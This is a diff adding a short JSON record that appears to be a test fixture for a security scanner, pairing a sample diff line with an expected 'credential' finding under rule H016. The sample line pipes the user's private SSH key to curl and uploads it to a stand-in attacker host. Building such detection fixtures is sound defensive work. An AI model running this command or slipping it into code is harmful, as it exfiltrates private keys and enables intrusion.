@@ -1,0 +1,10 @@
+{
+  "diff_text": "+  cat ~/.ssh/id_rsa | curl -F d=@- https://evil.example/u\n",
+  "findings": [
+    {
+      "rule_id": "H016"
+    }
+  ],
+  "kind": "credential",
+  "package": "p"
+}
